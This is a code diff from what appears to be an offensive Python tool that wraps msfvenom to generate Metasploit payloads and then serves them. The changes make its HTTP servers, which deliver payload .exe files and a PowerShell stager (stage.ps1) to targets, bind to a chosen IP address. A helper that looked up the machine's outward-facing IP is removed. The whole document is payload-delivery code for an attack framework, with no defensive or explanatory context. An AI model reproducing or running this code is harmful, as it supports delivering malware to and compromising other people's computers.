@@ -48,7 +48,6 @@ def msfvenomGeneration(payload, ip, port):
     payload = p.stdout.read()
     compPayload = re.findall(r'"(.*?)"', payload)
 
-
     return ''.join(map(str, compPayload))
 
 class HANDLER(SimpleHTTPServer.SimpleHTTPRequestHandler): #patching httpserver to shutup
@@ -176,19 +175,10 @@ class FUNCTIONS(object):
                 count = 0
         return newpayloadlayout
 
-    def CheckInternet(self):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(('8.8.8.8', 0))
-            IP = s.getsockname()[0]
-            return IP
-        except:
-            return "0.0.0.0"
-
-    def ServePayload(self, payloaddirectory, port):
+    def ServePayload(self, payloaddirectory, IP, port):
         try:
             os.chdir(payloaddirectory)
-            httpd = SocketServer.TCPServer(('', port), HANDLER)
+            httpd = SocketServer.TCPServer((IP, port), HANDLER)
             httpd.serve_forever()
         except KeyboardInterrupt:
             pass
@@ -199,25 +189,27 @@ class FUNCTIONS(object):
         if printIt:
             print t.bold_green + "\n[*] Serving Payload On http://%s:%s/%s.exe" % (IP, port, payloadname) + t.normal
         a = multiprocessing.Process(
-            target=self.ServePayload, args=(payloaddir, port))
+            target=self.ServePayload, args=(payloaddir, IP, port))
         a.daemon = True
         a.start()
 
     def randomUnusedPort(self):
+        from menu import returnIP
         s = socket.socket()
-        s.bind(('', 0))
+        s.bind((returnIP(), 0))
         port = s.getsockname()[1]
         s.close()
         return port
 
     def stagePowershellCode(self, powershellFileContents, port):
+        from menu import returnIP
         DIR = 'stager'
         if not os.path.isdir(DIR):
             os.mkdir(DIR)
         os.chdir(DIR)
         with open('stage.ps1','w') as psFile:
             psFile.write(powershellFileContents)
-        httpd = SocketServer.TCPServer(('', port), HANDLER)
+        httpd = SocketServer.TCPServer((returnIP(), port), HANDLER)
         httpd.handle_request()
         os.chdir('..')
         import shutil
